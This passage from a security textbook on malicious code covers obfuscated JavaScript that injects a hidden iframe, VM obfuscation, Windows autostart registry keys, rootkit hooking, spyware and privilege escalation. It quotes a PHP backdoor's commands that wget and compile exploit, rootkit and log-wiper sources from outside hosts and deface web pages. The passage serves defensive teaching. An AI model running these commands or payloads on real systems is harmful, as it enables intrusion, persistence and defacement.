piled code and a long period to complete the analysis. Obfuscation 
methods increase the amount of skill and time required by adding 
complexity and confusion to the code.
[Word Count: 65]

A common anti-reverse-engineering obfuscation technique involves 
self-modifying code. Self-modifying code makes static reverse engi-
neering difficult because the code changes itself at runtime. Routines 
within the application change the values and instructions within the
[Word Count: 34]

code when the program starts. The result is an application running in 
memory that is different from its initial appearance.
[Word Count: 20]

Widespread self-modifying code used to hinder reverse-engineer­
ing attempts, known as binary packing, obfuscates an executable’s 
machine code. Binary packing compresses executable code and adds 
functionality to the application to uncompress the code at runtime. 
This retains its original functionality but changes its appearance dra­
matically. Packed executables require the reverse engineer to analyze 
the unpacking routine and unpack the code before beginning code 
analysis steps.
[Word Count: 66]

Aside from restricting code analysis, malicious coders use obfus­
cation techniques to evade detection from signature-based security 
solutions. Signature-based security solutions, such as antivirus pro­
grams and intrusion detection and prevention systems, use signatures 
to search for specific values within files or packets traversing the net­
work. If the signature matches, an alert triggers to notify the user or 
administrator that malicious activity occurred. Obfuscating code and 
network activity evades detection from antivirus intrusion detection 
and prevention systems by altering values within files or packets that 
trigger signatures.
[Word Count: 88]

Many obfuscation techniques exist in the wild to change code or 
data into an unclear representation of itself. The variety of obfusca­
tion techniques available depends on the intended result and the 
environment in which the code or data exist. Regardless of the 
result or environment, obfuscation transformations obscure yet 
retain the original functionality. Typical modifications include 
encoding, concatenating, obscuring variable and function names, 
and adding or removing white space and new lines. Encryption 
achieves the same result as obfuscation but is not an obfusca-
tion method because it does not retain functionality without the 
required cipher key.
[Word Count: 98]

Encoding data and code in different representations adds obscurity 
to the information and instills confusion in the analyst. Encoding 
methods depend on the decoding functionality available in the appli-
cation. For example, using hexadecimal values to represent print-
able ASCII characters in a string transforms a human-readable 
cleartext string into an array of hexadecimal values. Exhibit 4-4 
shows JavaScript code that the Web browser interprets to decode the
[Word Count: 68]

hexadecimal values for “<iframe src=“bad.html” height=0 width=0>” 
to include in the browser window.
[Word Count: 13]

Obscure variable and function names obfuscate code by mak­
ing it difficult to read. Illegible variable names make human code 
analysis a burden because it is difficult to follow the random vari-
able name from initialization to assignment to use within the code. 
The same holds true for confusing function names. It is difficult 
to analyze the functionality within and the arguments sent to the 
unfamiliar function name. Use of randomization functions, such 
as rand(), to generate random variable and function names fur-
ther complicates analysis. Exhibit 4-6 shows a script with the same
[Word Count: 94]

<script>
document.write(“\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x22\x62\x61\x64\x2e\
x68\x74\x6d\x6c\x22\x20\x68\x65\x69\x67\x68\x74\x3d\x30\x20\x77\x69\x64\x74\x68\x3d\
x30\x3e”);
</script>
[Word Count: 5]

Exhibit 4-4  Encoded JavaScript to include a 0x0 IFrame to bad.html.
[Word Count: 11]

<script>
document.write(“\x3c\x69\x66\x72”+”\x61\x6d\x65\x20”+”\x73\x72\x63\x3d”+”\x22\x62\
x61\x64”+”\x2e\x68\x74\x6d”+”\x6c\x22\x20\x68”+”\x65\x69\x67\x68”+”\x74\x3d\x30\
x20”+”\x77\x69\x64\x74”+”\x68\x3d\x30\x3e”);
</script>
[Word Count: 5]

Exhibit 4-5  Concatenated JavaScript to include a 0x0 IFrame to bad.html.
[Word Count: 11]

functionality as seen in Exhibits 4-4 and 4-5 but with random vari­
able and function names.
[Word Count: 16]

White space and new line modifications complicate data and code. 
By removing white space and new lines, data and code quickly become 
cluttered and difficult to follow. Adding white space and new lines 
causes disarray in the opposite manner by spreading out data and code 
to impede analysis. Exhibit 4-7 shows the same script as in Exhibit 
4-6 without new lines to cause clutter.
[Word Count: 64]

var ryerioeu = “\x3c\x69\x66\x72”+”\x61\x6d\x65\x20”+”\x73\x72\x63\x3d”+”\x22\x62\
x61\x64”+”\x2e\x68\x74\x6d”;
[Word Count: 5]

var mvcnvxcv = “\x6c\x22\x20\x68”+”\x65\x69\x67\x68”+”\x74\x3d\x30\x20”+”\x77\x69\
x64\x74”+”\x68\x3d\x30\x3e”;
[Word Count: 5]

Exhibit 4-6  Random variable and function names.
[Word Count: 7]

<script>var kdfjaslf=document.write;var ryerioeu=”\x3c\x69\x66\x72”+”\x61\
x6d\x65\x20”+”\x73\x72\x63\x3d”+”\x22\x62\x61\x64”+”\x2e\x68\x74\x6d”;var 
mvcnvxcv=”\x6c\x22\x20\x68”+”\x65\x69\x67\x68”+”\x74\x3d\x30\x20”+”\x77\
x69\x64\x74”+”\x68\x3d\x30\x3e”;kdfjaslf(ryerioeu+mvcnvxcv);</script>
[Word Count: 6]

Exhibit 4-7  Cluttered JavaScript code without new lines.
[Word Count: 8]

Another useful method to perform dynamic analysis involves 
a debugger to step through the executing code. This allows one to 
observe the computer interpreting the obfuscated code. An exam­
ple of a dynamic analysis tool is Jsunpack. Jsunpack18 deobfuscates 
JavaScript code by running the obfuscated script through an emu­
lated Web browser and displaying the results. Jsunpack displays the 
code and data at multiple stages as the browser naturally deobfuscates 
while it steps through the script.
[Word Count: 76]

Obfuscation involves transformations to obscure information or 
code in an attempt to increase the difficulty to understand, analyze, 
and detect threats. Obfuscation is easy to recognize when observing 
overly complicated code or data; however, understanding the intent 
of the obfuscated code is difficult. Without reverse-engineering tech­
niques, analyzing obfuscated code and determining possible threats 
becomes nearly impossible. Reverse engineers use utilities, such as 
Jsunpack and DTMON, to analyze and understand the obfuscated 
code and its intent.
[Word Count: 76]

Attackers regularly use obfuscation techniques to obscure code func­
tionality and frustrate mitigation efforts. One of the most advanced 
obfuscation techniques executes code within a virtualized environ­
ment, making the use of traditional analytical tools difficult and 
therefore representing a dangerous and sophisticated threat.
[Word Count: 44]

Traditional obfuscation techniques ultimately rely on executing 
code in the context of the host system. In other words, an obfus-
cated binary designed to run on an Intel processor will execute the
[Word Count: 32]

obfuscated program using Intel instructions. Likewise, obfuscated 
JavaScript runs within the JavaScript engine of a Web browser. The 
code and data contained within the program may no longer resemble 
the original code, but the result is the same: the malicious code exe­
cutes using the native instruction set of the platform.
[Word Count: 51]

Traditional obfuscation systems, regardless of their level of advance­
ment, generally modify the binary in such a way that the binary can 
be analyzed using the tools and techniques available for the binary’s 
platform. The analysis process is typically slow due to the injection 
of junk code, the modified loops and various other obfuscation tech-
niques used. VM obfuscation systems, on the other hand, replace the 
original binary with a binary that contains three components: boot-
strap code, a bytecode VM interpreter, and the program converted 
into a byte stream. Exhibit 4-8 depicts these components. The key to
[Word Count: 98]

Exhibit 4-8  Typical components of a virtual machine (VM)–obfuscated binary.
[Word Count: 10]

the effectiveness of VM obfuscation systems lies in the fact that the 
original program is converted from its original processor (e.g., Intel 
x86) to a custom processor that requires interpreter code to execute.
[Word Count: 33]

The bootstrap code of a VM-obfuscated binary provides the mini­
mal amount of native platform execution instructions necessary to 
load the VM interpreter. The bootstrap usually contains a startup 
algorithm that performs the following functions:
[Word Count: 35]

1.	Inspect the operating system for the existence of debugging
[Word Count: 10]

tools.
	
2.	Terminate the loading of the binary if debugging tools are
[Word Count: 12]

found.
	
3.	Unpack the rest of the obfuscated binary.
	
4.	Transfer control to the VM interpreter.
[Word Count: 16]

Once the bootstrap passes control to the VM interpreter, the inter-
preter engine begins the process of executing the bytecode stream
[Word Count: 21]

(Change the VM Architecture,
Randomize Byte-code Interpreter)
[Word Count: 7]

Exhibit 4-9  Logic for an actor creating a VM-obfuscated binary.
[Word Count: 10]

that represents the original program. The interpreter itself is usually a 
lightweight subroutine that reads the byte stream and dispatches the 
appropriate handler for the bytecode. A bytecode handler is a small 
chunk of native platform code that translates the abstract bytecode 
into native platform executable instructions. The interpreter of the 
VMProtect20 VM obfuscation system, for instance, does little more 
than read the next bytecode and, using a small jump table, executes 
the handler responsible for the interpretation of that bytecode. Exhibit 
4-10 shows the disassembly of the VMProtect VM interpreter.
[Word Count: 91]

The bytecode is the core of the VM obfuscation’s power. VM obfus­
cation transforms the original program by converting native instruc­
tions such as ADD, MOV, XOR, JMP, and so on into bytecode 
representations of the same methods. The conversion from native code 
to bytecode allows the VM interpreter to organize the architecture of 
the virtual machine in a manner that is completely different from that 
of the original platform.
[Word Count: 70]

Using VMProtect again as an example, the obfuscation system 
converts Intel x86 opcodes into a stack-based machine. x86 instruc-
tions operate using central processing unit (CPU) registers and rely 
on the stack as the primary means to store temporary data and pass 
variables. The conversion from this native register-based platform to
[Word Count: 51]

VMProtect_main
proc near
pushf
pusha
push
0
mov
esi, [esp+40]
cld
mov
ecx, 40h
call
ManageScratchPadHeap
mov
edi, eas
add
esi, [esp]
cmdLoop:
[Word Count: 23]

lodsb
movzx
eax, a1
jmp
ds:cmdJmpTable[eax*4]
VMProtect main
endp
[Word Count: 9]

Exhibit 4-10  VMProtect’s VM interpreter.
[Word Count: 5]

In addition to changing the architecture of the VM, the VM obfusca­
tor can remove critical program flow constructs on which many analysts 
rely. For instance, VMProtect does not contain bytecode instructions 
to perform jumps, calls, or conditional jumps. These instruction types 
allow analysts to identify decision points in a program quickly; their 
absence makes the determination of flow control difficult.
[Word Count: 61]

VM obfuscation is by far one of the most advanced obfuscation 
systems available to malicious code authors today. The obfuscation 
technique prevents static analysis of malicious code by changing the 
very platform on which the code executes. Dynamic analysis may 
reveal some details of the inner workings of the program, but without 
a static analysis tool, the obfuscated binary may hold unseen func-
tionality that may trigger unexpectedly. With the availability of VM
[Word Count: 73]

obfuscation systems for malicious code authors, malicious code ana­
lysts are scrambling to find new techniques to combat this very real, 
very dangerous threat.
[Word Count: 24]

This section explains the many ways that malicious programs use legit­
imate (and sometimes undocumented) features of Windows to ensure 
they execute each time Windows starts up. The article discusses each 
stage of the boot process and how malicious code has, or could, run at 
that phase. Regular audits of common autostart locations are the best 
way to identify unauthorized startup attempts.
[Word Count: 62]

At each stage of the boot process, there are places for malicious 
code to make changes that will cause it to run after a reboot. Exhibit 
4-11 shows a timeline of the Windows boot process and techniques 
that malicious code can use to ensure it starts up with the system.
[Word Count: 50]

4.2.3.1  Basic Input–Output System (BIOS)/Complementary Metal-Oxide 
Semiconductor (CMOS) and Master Boot Record (MBR) Malicious Code  A 
computer’s basic input–output system (BIOS) is executed at the very 
beginning of system boot, and in many modern computers, the BIOS 
is stored in a programmable flash memory chip on the motherboard.
[Word Count: 48]

BIOS/CMOS
Master Boot
Record (MBR)
Hypervisor
(Blue Pill)
Legacy Text Files
(autoexec.*,*.ini)
Autostart
Registery Entries
Start Menu
“Startup” Folder
[Word Count: 19]

Exhibit 4-11  Potential autostart techniques in a boot order timeline.
[Word Count: 10]

4.2.3.3  Legacy Text Files  Microsoft designed Windows for compati-
bility; therefore, many techniques from legacy operating systems (e.g., 
DOS) continue to operate correctly in Windows XP or Vista. Older 
versions of the operating system relied on simple configuration and 
script files to run executables on startup, such as autoexec.bat, system.
[Word Count: 50]

ini, win.ini, and others. Exhibit 4-12 displays an example system.ini 
file that allows the system to load various drivers and dynamic link 
library (DLL) files.
[Word Count: 25]

For malicious code to instruct win.ini or system.ini to run it on 
startup, the code simply adds a few lines to either file. For example, a 
malicious program could add the following text to win.ini to execute 
malware.exe every time the system starts:
[Word Count: 43]

Accomplishing the same thing using either system.ini or autoexec.
bat is just as easy, although the format is different for each. While 
these tricks are easy to use, relatively few malicious code authors 
choose them over more common registry entries. They are not any 
easier to implement than the registry entries, are no more effective, 
and are arguably easier to detect.
[Word Count: 61]

4.2.3.4  Autostart Registry Entries  The location to specify executables 
that run at startup in modern Windows operating systems is the 
Windows Registry. Malicious programs have many choices for reg­
istry keys that effect system startup. The most recognizable and com-
monly used is the HKLM(HKCU\Software\Microsoft\Windows\
CurrentVersion\Run key. Other keys that have the same or similar 
effects include the following:23
[Word Count: 59]

•	 HKLM\Software\Microsoft\Windows NT\CurrentVersion\
[Word Count: 3]

Exhibit 4-12  An example of a System.ini file on Windows XP.
[Word Count: 11]

•	 HKLM\Software\Microsoft\Windows NT\CurrentVersion\
[Word Count: 3]

Winlogon\Notify
•	 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\
[Word Count: 3]

RunOnce
•	 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\
[Word Count: 3]

RunOnceEx
•	 HKUS\S-1-5-20\Soft ware\ Microsoft\Windows\
[Word Count: 5]

CurrentVersion\Run
•	 HK L M \ SOF T WA R E\ M ic rosof t\Window sN T \
[Word Count: 18]

CurrentVersion\TerminalServer\Install\Software\Microsoft\
Windows\CurrentVersion\Run
•	 HK L M \ SOF T WA R E\ M ic rosof t\Window sN T \
[Word Count: 19]

CurrentVersion\TerminalServer\Install\Software\Microsoft\
Windows\CurrentVersion\Runonce
•	 HK L M \ SOF T WA R E\ M ic rosof t\Window sN T \
[Word Count: 19]

CurrentVersion\TerminalServer\Install\Software\Microsoft\
Windows\CurrentVersion\RunonceEx
•	 HKCR\exefile\shell\open\command
•	 HKCU\Software\Microsoft\Windows\CurrentVersion\
[Word Count: 6]

Explorer\FileExts
•	 H K C U \ S o f t w a r e \ M i c r o s o f t \ A c t i v e S e t u p \
[Word Count: 38]

InstalledComponents\KeyName\StubPath
•	 H K L M \ S o f t w a r e \ M i c r o s o f t \ A c t i v e S e t u p\
[Word Count: 37]

InstalledComponents\KeyName\StubPath
•	 HKLM\Software\Microsoft\WindowsNT\CurrentVersion\
[Word Count: 3]

Winlogon
•	 HKCU(HKLM)\SOFTWARE\Microsoft\Windows\
[Word Count: 3]

CurrentVersion\ShellServiceObjectDelayLoad
•	 H K L M \ S O F T WA R E \ M i c r o s o f t \W i n d o w s\
[Word Count: 31]

CurrentVersion\Explorer\SharedTaskScheduler
•	 HKLM\SYSTEM\CurrentControlSet\Services
•	 HKCU\Control Panel\Desktop\SCRNSAVE.EXE
•	 HK LM \SYSTEM \Cur rentControlSet\Control\
[Word Count: 12]

SessionManager
•	 HKCU\Software\Microsoft\CommandProcessor
[Word Count: 3]

Many of these registry locations are not designed specifically to allow 
programs to start at boot but have a similar effect. One of the more
[Word Count: 25]

unusual examples is HKCU\ControlPanel\Desktop\SCRNSAVE.
EXE, which defines the program that Windows launches as the 
screensaver.
[Word Count: 15]

4.2.3.5  Start Menu “Startup” Folder  The Windows Start Menu con­
tains a special “Startup” folder. When explorer.exe first runs after a 
user has logged on, every program or link in this folder is executed. 
The purpose of this is similar to that of the more basic autostart reg­
istry entries, but its use predates the existence of those entries, and 
some programs still use the “Startup” directory to launch themselves 
at logon.
[Word Count: 72]

4.2.3.6  Detecting Autostart Entries  There are a variety of tools avail­
able to help researchers detect the use of these persistent methods. 
None can detect every location, but each is useful in its own way.
[Word Count: 35]

Malicious code sometimes sets the attributes of its autostart entries 
to “hidden” so that they are more difficult to detect, but security prac-
titioners can turn this against the malicious code. Searching specif-
ically for new, hidden registry entries and files can be an effective 
means of detecting many of these entries.
[Word Count: 52]

When a malicious code author is looking for the means to ensure 
that his or her malicious code persists through a reboot, it is clear 
that there are many options available. Not only can the author 
choose whichever best suits his or her needs, but also it is not always 
even necessary to edit the autostart entries themselves because the
[Word Count: 60]

Organizations intent on reducing the impact of persistent mali­
cious code should regularly audit common autostart locations for 
suspicious entries, so that entries made by malicious code are easily 
distinguished from those that are legitimate. In addition to helping 
detect new malicious code, this behavior helps to familiarize security 
practitioners with how these locations should look on a normal system 
so that they can more easily remove malicious entries after malicious 
code is detected, even if it is detected by other means such as antivirus 
programs. As with many malicious code prevention techniques, vigi-
lance is important.
[Word Count: 97]

Exhibit 4-13  An msconfig user interface.
[Word Count: 6]

Security firms are reporting that the sophistication and complexity 
of malware are growing. Malware authors often use techniques from 
existing tools when developing malicious software. This section exam­
ines the strategies an attacker uses to conceal the pervasive threat of 
rootkit tools and techniques.
[Word Count: 44]

A rootkit is a tool that allows actors to retain their administrative 
(or root) privileges and to hide their activity. A rootkit achieves stealth 
by modifying the way a user program receives information from the 
operating system. Rootkits often modify processes or modify the sys­
tem to falsify and hide information.
[Word Count: 51]

4.2.4.1  User Mode Rootkits  User mode rootkits are able to hide infor­
mation by targeting a user’s running processes. The rootkit can hook 
critical functions of a process by altering the process’s import address 
table (IAT) or by injecting a dynamic link library (DLL) or other 
code into the memory of a running process. Exhibit 4-14 shows how a 
user mode rootkit can hide the result of a user mode function call.
[Word Count: 72]

the original function. In this way, a rootkit calls the original function 
and modifies its results to hide information.
[Word Count: 19]

Hooking using the IAT is not ideal because there are other ways 
that the program can call the functions that the rootkit will be unable 
to intercept. For example, a program can resolve functions by calling 
LoadLibrary to load a DLL file and then calling GetProcAddress to 
convert a function name into a memory address.
[Word Count: 55]

An alternative strategy that is more effective is to have the root­
kit modify the memory or files associated with each function call. 
One common example of this is the use of a trampoline (inline hook). 
In the following code comparison, the rootkit modifies the first five 
bytes of the user mode function call (in this case, send).
[Word Count: 58]

Address	
Instruction	
Instruction
	
before rootkit	
after rootkit
send+0mov edi, edi	
jmp [rootkit function]
send+2push ebp
send+3mov ebp, esp
send+5sub esp, 10	
sub esp, 10
send+8push esi	
push esi
[Word Count: 28]

Originally, the send function starts with instructions (mov, push, 
mov) for the function prologue. The rootkit modifies these instruc-
tions, replacing them with a jump to the [rootkit function] instead. In 
this way, the rootkit can insert itself in a more reliable way and execute 
every time the hooked process calls the send function. To preserve the 
original functionality, the rootkit should append the commands that 
it replaced to the [rootkit function] shown below:
[Word Count: 74]

Exhibit 4-14  A user mode rootkit hides HiddenFile.txt.
[Word Count: 8]

//Begin rootkit function with custom rootkit commands
	
…
//execute send+0 … send+3
	
mov edi, edi
	
push ebp
	
mov ebp, esp
//return to original function
	
jmp send+5
[Word Count: 26]

This trampoline shows how to execute custom rootkit commands 
before executing the send function. Once the rootkit function fin­
ishes, it executes send+0 … send+3, then returns to the remaining 
unmodified segment starting at send+5.
[Word Count: 35]

These user mode rootkit techniques require that the rootkit inject 
code or alter memory within the target process. There are different 
ways that rootkit code can modify the memory of other processes, 
such as using the Windows API calls like VirtualAlloc and then 
CreateRemoteThread. A rootkit can also use DLL injection to inject 
code within a target process. More information on the DLL injection 
technique is available in “iDefense Explains … DLL Injections.”28
[Word Count: 73]

4.2.4.2  Kernel Mode Rootkits  Stealthier rootkits will attempt to load 
into the kernel to influence critical memory structures and avoid 
detection. Some of the ways that rootkits gain this high level of access 
are by injecting code into privileged processes, by registering a kernel 
module (device driver), or by modifying the early stages of the boot
[Word Count: 56]

process. A kernel mode rootkit may make changes to critical kernel 
memory structures to hook and alter certain kernel mode function 
calls on the system.
[Word Count: 25]

The system service descriptor table (SSDT) is one target in kernel 
memory that the rootkit may try to hook. The SSDT serves as an address 
lookup table for system API calls like those that begin with “Nt” (like 
NtOpenProcess) and other kernel versions of API calls. Exhibit 4-15 
shows how the SSDT handles user mode function calls and other code 
that may call kernel mode functions through the SSDT.
[Word Count: 69]

Modifying entries in the SSDT can similarly allow an attacker to 
replace functions with rootkit functionality that hides information. 
Unlike user mode hooking techniques, which apply to a single pro­
cess, hooking the SSDT affects every process on a system that uses 
the functions.
[Word Count: 44]

Rootkits may also target the CPU interrupt descriptor table (IDT). 
This involves altering the function addresses whenever the CPU exe­
cutes INT (short for interrupt) or SYSENTER assembly instructions. 
The rootkit can obtain the current address of these calls (using “sidt” 
in the case of INT and “rdmsr” in the case of SYSENTER) and then 
modify these addresses to use the rootkit’s function instead (using the 
address returned by “sidt” in the case of INT and “wrmsr” in the case 
of SYSENTER).
[Word Count: 82]

The rootkit may also target loaded drivers by altering the I/O (input–
output) request packet (IRP) function call table. IRPs are signals sent to 
device drivers that serve as an interface between hardware and software.
[Word Count: 35]

Exhibit 4-15  The system service descriptor table (SSDT) resolves kernel mode functions into 
addresses.
[Word Count: 14]

The IRPs table for each kernel driver contains handling functions that 
accept a device object and IRP information. Calling these functions 
from low-level signals is powerful but does not always directly allow a 
rootkit to hook and modify certain functions at a higher level.
[Word Count: 44]

The SSDT, IDT, and IRP are only a few targets that kernel-level 
rootkits may target. To modify these structures, the rootkit must exe­
cute within a process with high privileges, such as a kernel driver, and 
may need to take measures to modify the memory permissions. Read-
only memory permissions protect memory pages that do not need to 
change frequently. For more information on the latest techniques that 
rootkits are using, visit rootkit.com or refer to “Rootkits: Subverting 
the Windows Kernel.”27
[Word Count: 81]

Malicious software takes on many different forms, but one form, 
known as spyware, can cause a victim great hardship. The term
[Word Count: 21]

spyware describes a class of malware based on the functionality of its 
payload. This class differs from other malware classifications, such as 
worms and viruses, which classify the malware based on the propaga­
tion method. In this article, iDefense explains the distinct character­
istics that set spyware apart from other forms of malware.
[Word Count: 53]

An attacker installs spyware onto a system to monitor a user’s 
activity without his or her knowledge. The activity monitored var­
ies among different spyware samples, but the overall goal is to steal 
information. Information stolen from spyware-infected systems can 
include typed keys, form data, e-mail addresses, credentials, certifi­
cates, pictures and videos from attached Web cams, audio from an 
attached microphone, documents, software licenses, network activity, 
and cookies.
[Word Count: 69]

Other spyware samples employ more specific credential-stealing 
techniques than key logging. The first technique involves form grab-
bing, which is the act of stealing information entered into a form
[Word Count: 29]

within a Web browser. Websites use forms for a user to enter logon 
credentials. Form-grabbing spyware minimizes the amount of infor­
mation gathered by stealing data only included in these forms.29 For 
example, the prolific Zeus banking Trojan steals a user’s online bank­
ing credentials by monitoring his or her Web browser and capturing 
usernames and passwords used to log onto banking websites.
[Word Count: 63]

Another specific method to steal credentials and sensitive data 
from a system includes retrieving stored usernames and passwords 
from Windows Protected Storage (WPS). WPS is a location in the 
Windows registry that holds auto-complete data and saved passwords 
for Internet Explorer, Outlook, and MSN Messenger. Spyware can 
access these data and enumerate credentials without gathering large 
amounts of useless data. Spyware also steals usernames and passwords 
from other Web browsers, e-mail, and Instant Messenger clients that 
store credentials locally.
[Word Count: 79]

Network monitoring also enables spyware to steal information 
from a user. Usernames and passwords sent over the network in 
cleartext reside within network packets, such as those sent for file 
transfer protocol (FTP), simple mail transfer protocol (SMTP), and 
HTTP requests, that spyware with network-monitoring capabilities 
can steal. Spyware also profiles users by monitoring websites they visit 
within the network traffic.
[Word Count: 61]

Spyware can also perform e-mail harvesting on infected systems. 
E-mail harvesting gathers e-mail addresses from a user’s e-mail address
[Word Count: 19]

book by scanning files on the system for strings that match an e-mail 
format or by monitoring network traffic for e-mail activity. The spy­
ware then sends the gathered e-mail addresses back to the attacker.
[Word Count: 35]

Attackers’ motives to use spyware to steal sensitive information 
and credentials generally involve identity theft or account access. An 
attacker can use sensitive information in identity theft schemes, such 
as opening a credit card with the victim’s name. Stolen credentials 
can grant the spyware creator access to personal accounts, such as 
online-banking or social-networking accounts, or other systems for 
further spyware infection. In addition to gaining access to sensitive 
information and credentials, targeted attackers use spyware to collect 
intelligence and sensitive documents from compromised systems.
[Word Count: 85]

Overall, a majority of spyware authors create their applications to 
make money. Exhibit 4-16 shows the general steps that an attacker 
takes to generate revenue. The steps include the installation of the 
attacker’s spyware, followed by the specific actions performed by the 
spyware’s payload, and finally the profits received from the stolen 
information.
[Word Count: 53]

Spyware steals e-mail addresses for future spam campaigns and 
is a major contributor of addresses that spammers use in unsolicited 
e-mails. After gathering the stolen e-mail addresses, spyware authors 
pool the addresses to compile a list of targets. For example, iDefense 
recently discovered the Waledac botnet’s spam list, which contained 
14 gigabytes of stolen e-mail addresses. Spyware authors can use a list 
of targets to send spam e-mail or to sell the addresses to others that 
intend to send spam. Other spammers often purchase these stolen 
e-mail addresses to generate revenue with their own spamming or 
phishing campaigns.
[Word Count: 98]

User profiling based on monitored network activity can help the 
spyware author present meaningful advertisements that may appeal to
[Word Count: 19]

Steal Credentials
Steal Personal Information
Steal E-mail Addresses
Monitor Network Activity
[Word Count: 11]

Identity Teft
Financial Account Access
Spam
Advertisements
[Word Count: 7]

Exhibit 4-16  Steps that spyware creators take to make money.
[Word Count: 10]

a victim. Appealing advertisements are more likely to catch a victim’s 
attention and to increase the probability that a victim will click the 
advertisement for more information or purchase. Spyware authors use 
pop-ups or advertisements displayed in the browser to generate rev­
enue through click-fraud schemes targeting pay-per-click services30 or 
affiliations with online stores that offer a monetary kickback for sales 
originating from advertisements.
[Word Count: 64]

4.2.6  Attacks against Privileged User Accounts and Escalation of Privileges
[Word Count: 10]

User access control is a powerful tool to limit what users can do, 
including files they can access, network resources, and important
[Word Count: 22]

configuration settings. In the corporate network environment, many 
organizations use limited user accounts to prevent damage from mali­
cious code. In this way, administrators prevent attackers from modify­
ing critical system files, writing to directories (such as \WINDOWS\ 
or \Program Files\), and modifying registry values. Similarly, services 
often run with limited user accounts, such as a specific user for a Web 
server. Malicious code that runs as a limited user is less dangerous 
because it can only access or modify resources to which the infected 
user has permission.
[Word Count: 88]

Vulnerabilities that increase the privileges of the current user, 
known as privilege escalation, are a serious problem for desktops and 
servers, and these vulnerabilities affect all operating systems. In this 
section, we discuss attacks against Linux servers, Windows servers, 
and Windows desktops, attacks that all attempt to gain administra­
tor permissions after compromising a limited account. Such attacks 
indicate the importance of limiting exposure within other parts of 
the system and using multiple levels of defense, which could prevent 
damage when attackers use privilege escalation attacks.
[Word Count: 86]

4.2.6.1  Many Users Already Have Administrator Permissions  Users 
and even programmers frequently use administrator permissions on 
Microsoft Windows systems for convenience. Similarly, many mali­
cious code authors do not anticipate executing their malicious pro­
grams as limited users; therefore, such programs often fail to function 
correctly. Many malicious code authors create files directly in the \
WINDOWS\system32\ directory, load new drivers such as network 
sniffers, install browser helper objects (BHOs), or register startup 
entries. Administrators can prevent many of these actions by employ-
ing limited user accounts.
[Word Count: 87]

Automatic malicious code analysis environments such as the iDe-
fense Automatic Rapid Malcode service, Anubis, ThreatExpert, 
CWSandbox, and Joebox even run code as administrators because 
malicious code commonly requires it. Many administrators do not 
need to give administrator permissions to regular users. In giving 
them limited permissions, administrators will reduce the risk that 
malicious code will affect users.
[Word Count: 58]

There are rare cases for running services with administrator per-
mission on servers, but applications should not normally need elevated
[Word Count: 20]

permissions to run. Services that require root to function should 
whitelist allowed IP addresses to allow access, should use authenti­
cation before gaining access (via a virtual private network [VPN]), 
and must be highly restricted and evaluated for vulnerabilities if the 
services are widely available.
[Word Count: 45]

Attackers may distribute modified backdoor shells that allow them 
to exploit various local escalation vulnerabilities after they exploit a 
server. For example, an actor modified the Locus7s Modified c100 
Shell backdoor PHP script to include a variety of different ways 
to gain administrator or additional permissions (see Exhibit 4-17). 
Exhibit 4-18 displays a select option for identifying misconfigured
[Word Count: 58]

accounts and gaining privileges by using a dropdown menu from the 
Locus7s Modified c100 Shell backdoor.
[Word Count: 16]

4.2.6.3  Conclusion  Privilege escalation attacks remain relatively rare 
in comparison to the amount of malicious code that virus authors 
create. While limited user accounts raise the bar for attackers because
[Word Count: 30]

Exhibit 4-17  A logo for a PHP backdoor.
[Word Count: 8]

find /bin [removed] -perm -4000 2> /dev/null
Suid bins
[Word Count: 9]

cut -d: -f1,2,3 /etc/passwd | grep ::
USER WITHOUT PASSWORD!
[Word Count: 10]

find /etc/ -type f -perm -o+w 2> /dev/null
Write in /etc/?
[Word Count: 11]

wget http://www.packetstormsecurity.org/UNIX/
penetration/log-wipers/zap2.c
[Word Count: 3]

wget http://ftp.powernet.com.tr/supermail/debug/k3
Kernel attack (Krad.c) PT1
(If wget installed)
[Word Count: 9]

wget http://precision-gaming.com/sudo.c
wget Linux sudo stack overflow
[Word Count: 7]

gcc sudo.c -o sudosploit
Compile Linux sudo sploit
[Word Count: 8]

wget http://twofaced.org/linux2-6-all.c
Linux Kernel 2.6.* rootkit.c
[Word Count: 6]

gcc linux2-6-all.c -o linuxkernel
Compile Linux2-6-all.c
[Word Count: 6]

wget http://twofaced.org/mig-logcleaner.c
Mig LogCleaner
[Word Count: 4]

gcc -DLINUX -WALL mig-logcleaner.c -o migl
Compile Mig LogCleaner
[Word Count: 9]

sed -i -e ‘s/<html>/HACKED BY LOCUS7S/g’ index.*
index.* Mass Defacement
[Word Count: 10]

Exhibit 4-18  Options for identifying misconfigured accounts and gaining privileges.
[Word Count: 10]

they do not immediately have system permissions, it is clear that they 
will attempt to gain additional privileges regardless of the system they 
are attacking. Although enforcing limited user privileges does not 
fully mitigate malicious attacks, organizations that follow this best 
practice will find it easier to perform incident response. First, they 
can audit what the user has access to read or modify, then they can 
evaluate whether an attacker attempted to gain privileges and access 
or modify files to which the user does not normally have access.
[Word Count: 88]

Token kidnapping involves impersonation tokens. As mentioned 
in Section 1.2.1 on Windows tokens, impersonation tokens identify 
threads within a process and have an associated impersonation level. 
For example, programs using the Microsoft Distributed Transaction 
Coordinator (MSDTC) use a network service token.
[Word Count: 41]

The token level of impersonation is very important in token kid­
napping, as anonymous and identification-level tokens do not have 
sufficient privileges to carry out operations on the process’ behalf. 
The impersonation level allows the thread to perform operations with 
the permissions of the user running the process. For example, if the 
program using MSDTC does not have a token level of imperson­
ation, then it cannot operate with the permissions of the network ser­
vice. Exhibit 4-20 shows the MSDTC token for the network service 
account having a token level of impersonation.
[Word Count: 93]

For successful token kidnapping, an impersonated user needs to 
acquire the permissions of another higher privileged account. The 
higher privileged accounts are vital as each process and thread have 
their own access control list. These access control lists define who can 
access the thread or process and what operations they may perform. 
The PROCESS_DUP_HANDLE access right is a necessity to dupli-
cate object handles in another process. The object handle duplicated in 
token kidnapping is the handle to the privileged token.
[Word Count: 81]

1. Connect to Service
2. Impersonate a Service to Assign
 the Process’s Token to Tread
3. Duplicate Privileged Token in
 Tread
4. Use Privileged Token from Tread
 for System Exploitation
[Word Count: 30]

Exhibit 4-19  A visual representation of the token-kidnapping process.
[Word Count: 9]

User: NT AUTHORITY\NETWORK SERVICE
Privileges: SeCreateGlobalPrivilege SeImpersonatePrivilege SeChangeNotifyPrivilege
Token type: Impersonation
Token level: SecurityImpersonation
[Word Count: 14]

Exhibit 4-20  Process tokens after initializing Microsoft Distributed Transaction Coordinator 
(MSDTC) with SeImpersonate enabled.
[Word Count: 14]

As discussed in Section 1.2.1 on Windows tokens, the PROCESS_
DUP_HANDLE is a permission granted to a primary token since it 
